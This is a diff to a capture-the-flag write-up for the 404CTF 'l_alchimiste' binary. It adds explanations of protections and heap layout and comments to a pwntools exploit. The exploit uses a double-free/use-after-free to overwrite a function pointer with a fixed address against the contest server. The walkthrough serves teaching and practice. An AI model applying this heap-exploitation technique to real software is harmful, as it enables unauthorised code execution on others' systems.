@@ -25,6 +25,17 @@ $ checksec l_alchimiste
     PIE:      No PIE (0x400000)
 ```
 
++ `Arch:` amd64-64-little: This indicates that the binary is built for the AMD64 architecture, which is a 64-bit architecture.
+
++ `RELRO:` Full RELRO: RELRO (Relocation Read-Only) is a security feature that protects against certain types of attacks. "Full RELRO" means that all relocations in the binary are read-only, providing enhanced protection against attacks such as GOT (Global Offset Table) overwrite.
+
++ `Stack:` Canary found: This indicates that a stack canary is present in the binary. A stack canary is a security mechanism that helps detect and prevent stack-based buffer overflows.
+
++ `NX:` NX enabled: NX (No-Execute) is a hardware feature that prevents executing code from regions of memory that are marked as non-executable. Enabling NX helps mitigate certain types of memory-based attacks, such as buffer overflow attacks that attempt to execute malicious code.
+
++ `PIE:` No PIE (0x400000): PIE (Position Independent Executable) is a security feature that randomizes the base address of the binary in memory, making it harder for attackers to exploit memory-based vulnerabilities. In this case, the binary does not have PIE enabled, and its base address is fixed at 0x400000.
+
+
 Execute the ELF file
 
 ```shell
@@ -73,6 +84,13 @@ From this function we can deduce the information as shown below
 ![getStats](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/af4d1633-05d4-4cc1-9eda-20a5ba0ae855)
 
 
+Based on the implementation of the `showStats` and `showStat` functions, it can be deduced that our character is a structure consisting of four fields: 
+
++ FOR
++ INT
++ OR
++ a pointer (that is initialized as NULL)
+
 **view_flag**
 
 ![view_flag](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/734a9616-faf2-4d0a-87c4-bf7fe71c9314)
@@ -92,7 +110,7 @@ void incInt(long param_1)
 }
 ```
 
-increase INT 
+increase INT by 10
 
 
 **incStr**
@@ -106,7 +124,7 @@ void incStr(int *param_1)
 }
 ```
 
-increase FOR
+increase FOR by 10
 
 
 **buyStrUpPotion**
@@ -116,6 +134,14 @@ increase FOR
 
 ![memo_buyStr](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/5fc9ba92-11e7-4750-9c26-3c8d9a64e84f)
 
+
+The first image above with the color boxes is the corresponding code between C and assembly. The second figure shows the important pieces of memory created by the code.
+
+> The function above will create a memory segment of 72 bytes and its address is stored in the pointer - the 4th field of our character.
+{: .prompt-info}
+
+> At the position of the last 8 bytes of the created memory, this function will store the address of the incStr function
+{: .prompt-info}
 
 **sendMessage**
 
@@ -133,7 +159,7 @@ void sendMessage(void)
   return;
 }
 ```
-We have `malloc()` in this function
+We have `malloc()` in this function. The malloc function here is very important because when we alternately call `free(), malloc(), free()`, the double-free() attack will not be detected. That can help us make a successful double-free() attack.
 
 **useItem**
 
@@ -168,29 +194,41 @@ This program examines the value at `param_1 + 0x10` (the 4th stat of the charact
 
 ```python
 def getStre():
+    # choose sendMessage()
     p.sendlineafter(b"\n>>>",b"3")
+    # saying something
     p.sendlineafter(b"[Vous] : ",b"ABCDEF")
     print(p.recvuntil(b'1:')[:-2].decode())
+    # choose useItem() ---> execute incStr
     p.sendlineafter(b"\n>>>",b"2")
 ```
 
-**Step 2** Once we have incremented the value for the "FOR" stat enough times, we can take advantage of the remaining amount of money and the Double-Free vulnerability to overwrite the address of the `incInt` function into the current 4th stat of character. By doing so, we can modify the behavior of the program and achieve arbitrary code execution.
+**Step 2** Once we have incremented the value for the "FOR" stat untils FOR>=150, we can take advantage of the remaining amount of money and the Double-Free vulnerability to overwrite the address of the `incInt` function into the current 4th stat of character. By doing so, we can modify the behavior of the program and achieve arbitrary code execution.
 
 ```python
+# Because this binary file dont have PIE enable, so the address of all 
+# instruction won't change. Therefore we can find incInt function address at 
+# 0x4008d5 and use it to replace address of incStr
 incInt = p64(0x4008d5)
 p.sendlineafter(b"\n>>>",b"3")
+# as described in the buyStrUpPotion function, incStr is located in the last
+# 8 bytes in the 72/0x48 byte memory segment and we. So we need 0x40 letter 
+# A to be able to reach and write to the last 8 bytes
 payload = b'A'*0x40 + incInt
 p.sendlineafter(b"[Vous] : ",payload)
 p.sendlineafter(b"\n>>>",b"2")
 ```
 
 
-**Step 3** w\We do the same as step 1 and done
+**Step 3** We do the same as step 1 and done
 
 ```python
 def getInt():
+    # choose sendMessage()
     p.sendlineafter(b"\n>>>",b"3")
-    p.sendlineafter(b"[Vous] : ",payload)
+    # saying something
+    p.sendlineafter(b"[Vous] : ",b'ABCDEF')
+    # choose useItem() ---> execute incStr
     p.sendlineafter(b"\n>>>",b"2")
 ```
 
@@ -205,28 +243,27 @@ p = remote("challenges.404ctf.fr",30944)
 def getStre():
     p.sendlineafter(b"\n>>>",b"3")
     p.sendlineafter(b"[Vous] : ",b"ABCDEF")
-    # print(p.recvuntil(b'1:')[:-2].decode())
     p.sendlineafter(b"\n>>>",b"2")
 
 
 p.sendlineafter(b"\n>>>",b"1")
-# print(p.recvuntil(b'1:')[:-2].decode())
 p.sendlineafter(b"\n>>>",b"2")
 
 for _ in range(5):
     getStre()
 
 
-
+# @incInt = 0x4008d5
 incInt = p64(0x4008d5)
 p.sendlineafter(b"\n>>>",b"3")
+# try to overwrite last 8 bytes in 0x48 bytes segments
 payload = b'A'*0x40 + incInt
 p.sendlineafter(b"[Vous] : ",payload)
 p.sendlineafter(b"\n>>>",b"2")
 
 def getInt():
     p.sendlineafter(b"\n>>>",b"3")
-    p.sendlineafter(b"[Vous] : ",payload)
+    p.sendlineafter(b"[Vous] : ",'ABCDEF')
     p.sendlineafter(b"\n>>>",b"2")
 
 for _ in range(12):
